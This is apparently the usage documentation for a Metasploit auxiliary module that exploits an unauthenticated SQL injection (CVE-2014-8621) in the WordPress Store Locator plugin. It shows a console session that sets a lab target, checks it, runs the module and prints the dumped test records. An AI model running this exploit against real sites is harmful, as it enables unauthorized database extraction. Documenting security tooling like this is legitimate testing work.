#### Add WordPress Plugin Store Locator SQL Injection Scanner.

  Application: WordPress Plugin 'Store Locator' 2.3-3.11
  Homepage: https://wordpress.org/plugins/store-locator/
  Source Code: https://downloads.wordpress.org/plugin/store-locator.3.11.zip
  References: https://wpvulndb.com/vulnerabilities/8241

#### Vulnerable packages*

  2.3
  3.11

#### Usage:

##### Linux (Ubuntu 12.04.5 LTS):
```
msfdevel 10.10.10.10 shell[s]:0 job[s]:0 msf>  use auxiliary/scanner/http/wp_store_locator_sqli 
msfdevel 10.10.10.10 shell[s]:0 job[s]:0 msf> auxiliary(wp_store_locator_sqli)  info

       Name: WordPress Store Locator Unauthenticated SQL Injection Scanner
     Module: auxiliary/scanner/http/wp_store_locator_sqli
    License: Metasploit Framework License (BSD)
       Rank: Normal
  Disclosed: 2014-11-05

Provided by:
  g0blin
  Roberto Soares Espreto <robertoespreto@gmail.com>

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                      yes       The target address range or CIDR identifier
  RPORT      80               yes       The target port
  TARGETURI  /                yes       The base path to the wordpress application
  THREADS    1                yes       The number of concurrent threads
  VHOST                       no        HTTP server virtual host

Description:
  This module attempts to exploit a SQL injection in Store Locator in 
  version 2.3-3.11 and likely prior in order if the instance is 
  vulnerable.

References:
  http://cvedetails.com/cve/2014-8621/
  https://wpvulndb.com/vulnerabilities/8241

msfdevel 10.10.10.10 shell[s]:0 job[s]:0 msf> auxiliary(wp_store_locator_sqli)  show options 

Module options (auxiliary/scanner/http/wp_store_locator_sqli):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target address range or CIDR identifier
   RPORT      80               yes       The target port
   TARGETURI  /                yes       The base path to the wordpress application
   THREADS    1                yes       The number of concurrent threads
   VHOST                       no        HTTP server virtual host

msfdevel 10.10.10.10 shell[s]:0 job[s]:0 msf> auxiliary(wp_store_locator_sqli)  set RHOSTS 10.10.10.20
RHOSTS => 10.10.10.20
msfdevel 10.10.10.10 shell[s]:0 job[s]:0 msf> auxiliary(wp_store_locator_sqli)  check
[*] 10.10.10.20:80 - The target appears to be vulnerable.
[*] Checked 1 of 1 hosts (100% complete)
msfdevel 10.10.10.10 shell[s]:0 job[s]:0 msf> auxiliary(wp_store_locator_sqli)  run

[+] 10.10.10.20:80 - Vulnerable to unauthenticated SQL injection within Store Locator
[+] 10.10.10.20:80 - File saved in: /home/espreto/.msf4/loot/20151123142534_default_10.10.10.20_storelocator.fil_435131.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msfdevel 10.10.10.10 shell[s]:0 job[s]:0 msf> auxiliary(wp_store_locator_sqli)  head /home/espreto/.msf4/loot/20151123142534_default_10.10.10.20_storelocator.fil_435131.txt
[*] exec: head /home/espreto/.msf4/loot/20151123142534_default_10.10.10.20_storelocator.fil_435131.txt

<markers>
<marker name="Test MSF" address="Foo Street, Sao Paulo, Sao Paulo 99999999" street="Foo Street" street2="" city="Sao Paulo" state="Sao Paulo" zip="99999999" lat="" lng="" distance="" description="Secret Informations" url="" hours="" phone="" fax="" email="foo@bar.net" image="" tags="" />
<marker name="Test MSF" address="Foo Street, Sao Paulo, Sao Paulo 99999999" street="Foo Street" street2="" city="Sao Paulo" state="Sao Paulo" zip="99999999" lat="" lng="" distance="" description="Secret Informations" url="" hours="" phone="" fax="" email="foo@bar.net" image="" tags="" />
<marker name="Test MSF" address="Foo Street, Sao Paulo, Sao Paulo 99999999" street="Foo Street" street2="" city="Sao Paulo" state="Sao Paulo" zip="99999999" lat="" lng="" distance="" description="Secret Informations" url="" hours="" phone="" fax="" email="foo@bar.net" image="" tags="" />
<marker name="Test MSF" address="Foo Street, Sao Paulo, Sao Paulo 99999999" street="Foo Street" street2="" city="Sao Paulo" state="Sao Paulo" zip="99999999" lat="" lng="" distance="" description="Secret Informations" url="" hours="" phone="" fax="" email="foo@bar.net" image="" tags="" />
<marker name="Test MSF" address="Foo Street, Sao Paulo, Sao Paulo 99999999" street="Foo Street" street2="" city="Sao Paulo" state="Sao Paulo" zip="99999999" lat="" lng="" distance="" description="Secret Informations" url="" hours="" phone="" fax="" email="foo@bar.net" image="" tags="" />
<marker name="Test MSF" address="Foo Street, Sao Paulo, Sao Paulo 99999999" street="Foo Street" street2="" city="Sao Paulo" state="Sao Paulo" zip="99999999" lat="" lng="" distance="" description="Secret Informations" url="" hours="" phone="" fax="" email="foo@bar.net" image="" tags="" />
<marker name="Test MSF" address="Foo Street, Sao Paulo, Sao Paulo 99999999" street="Foo Street" street2="" city="Sao Paulo" state="Sao Paulo" zip="99999999" lat="" lng="" distance="" description="Secret Informations" url="" hours="" phone="" fax="" email="foo@bar.net" image="" tags="" />
<marker name="Test MSF" address="Foo Street, Sao Paulo, Sao Paulo 99999999" street="Foo Street" street2="" city="Sao Paulo" state="Sao Paulo" zip="99999999" lat="" lng="" distance="" description="Secret Informations" url="" hours="" phone="" fax="" email="foo@bar.net" image="" tags="" />
<marker name="Test MSF" address="Foo Street, Sao Paulo, Sao Paulo 99999999" street="Foo Street" street2="" city="Sao Paulo" state="Sao Paulo" zip="99999999" lat="" lng="" distance="" description="Secret Informations" url="" hours="" phone="" fax="" email="foo@bar.net" image="" tags="" />
msfdevel 10.10.10.10 shell[s]:0 job[s]:0 msf> auxiliary(wp_store_locator_sqli)
```
